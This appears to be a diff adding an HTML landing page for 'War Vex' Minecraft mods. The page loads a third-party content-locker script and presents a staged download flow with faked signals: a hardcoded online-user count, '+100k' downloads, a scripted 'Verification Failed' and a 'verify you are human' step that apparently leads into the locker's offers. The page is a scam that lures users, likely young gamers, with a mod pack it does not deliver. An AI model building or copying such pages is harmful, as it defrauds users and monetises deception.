@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>War Vex - Minecraft Mods</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+    
+    <!-- Locker code (loaded but not shown until _vs() is called) -->
+    <script type="text/javascript">
+        var oMJIr_XHl_gvODIc={"it":4598443,"key":"a952a"};
+    </script>
+    <script src="https://d3v3431sr9puku.cloudfront.net/f7310a7.js"></script>
+</head>
+<body>
+    <canvas id="canvas"></canvas>
+
+    <div class="header">
+        <img src="https://i.pinimg.com/736x/17/cd/9b/17cd9b2684fe8e5546303bfbff0334de.jpg" class="profile" alt="Profile">
+        <div class="header-info">
+            <div class="socials">
+                <a href="https://www.instagram.com/warexvex" target="_blank">
+                    <img src="https://cdn-icons-png.flaticon.com/512/2111/2111463.png" alt="Instagram">
+                </a>
+                <a href="https://www.youtube.com/@WarexVex" target="_blank">
+                    <img src="https://cdn-icons-png.flaticon.com/512/1384/1384060.png" alt="YouTube">
+                </a>
+                <a href="https://www.tiktok.com/@warexvex" target="_blank">
+                    <img src="https://cdn-icons-png.flaticon.com/512/3046/3046122.png" alt="TikTok">
+                </a>
+            </div>
+            <div class="name">War Vex</div>
+        </div>
+    </div>
+    <div class="line"></div>
+
+    <div class="page-wrap">
+        <div class="big-box">
+            <div class="top-image-box">
+                <img src="https://m.media-amazon.com/images/I/81RLecrtazL.png" alt="War Vex Logo">
+            </div>
+            <div class="mods-title">Minecraft Mods</div>
+            <div class="status-container">
+                <div class="status-box">Status: <span style="color:green;">Online</span></div>
+                <div class="status-box">Last Update: Wed Apr 08 2026</div>
+                <div class="status-box">Online Users: <span id="onlineUsers">150</span></div>
+            </div>
+            <h3>Choose Your Platform</h3>
+            <div class="platforms" id="platformSelect">
+                <div class="platform"><i class="fab fa-android"></i>Android</div>
+                <div class="platform"><i class="fab fa-apple"></i>iOS</div>
+                <div class="platform"><i class="fab fa-windows"></i>Windows</div>
+            </div>
+            <h3>Choose Your Version</h3>
+            <div class="platforms" id="versionSelect">
+                <div class="platform">JAVA</div>
+                <div class="platform">BEDROCK</div>
+            </div>
+            <button class="continue-btn" id="continueBtn">Continue</button>
+            <div class="info-text">
+                You will download one file that contains all the mods tailored to the version you selected<br>
+                The file includes mods fully compatible with your device<br>
+                All mods shown in my videos are available and updated daily<br>
+                🫶Thank you🫶<br>
+                War Vex
+            </div>
+        </div>
+        <div class="copyright">War Vex © 2026 All Rights Reserved</div>
+    </div>
+
+    <!-- Overlay elements -->
+    <div id="overlayBox">
+        <div class="popup" id="popup">
+            <div class="loader">
+                <div class="box"></div><div class="box"></div><div class="box"></div>
+                <div class="box"></div><div class="box"></div><div class="box"></div>
+                <div class="box"></div><div class="box"></div><div class="box"></div>
+                <div class="box"></div>
+            </div>
+            <div id="designText">...Designing your file</div>
+        </div>
+        <div class="card" id="card">
+            <div class="top">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT00M8x1uRseYzma-PBp1yNlEeiXLH2yGuHKQ&s" id="cardImage" alt="Mod Pack">
+                <div>
+                    <div class="title">Premium Mod Pack</div>
+                    <div class="desc" id="descText">Optimized file for all devices.</div>
+                </div>
+            </div>
+            <div class="info">
+                <strong>Total Downloads: +100k</strong><br>
+                <strong>File Size: 1.28 GB</strong> (includes all mods & extras)<br>
+                <strong>A step-by-step installation tutorial video is included inside the file you will download</strong><br>
+            </div>
+            <div class="download">
+                <button onclick="verify()">Download Now</button>
+            </div>
+        </div>
+        <div class="popup" id="verifying" style="display:none;">
+            <div class="spinner"></div>
+            <div>...Verifying</div>
+        </div>
+        <div class="popup" id="fail" style="display:none;">
+            <div class="fail">❌</div>
+            <div>!Verification Failed</div>
+        </div>
+        <div class="verifyBox" id="finalBox">
+            <div>You are almost done! Please complete this final step by clicking the button below and follow all stated instructions to verify you are human</div>
+            <button id="finalVerifyBtn">Verify</button>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
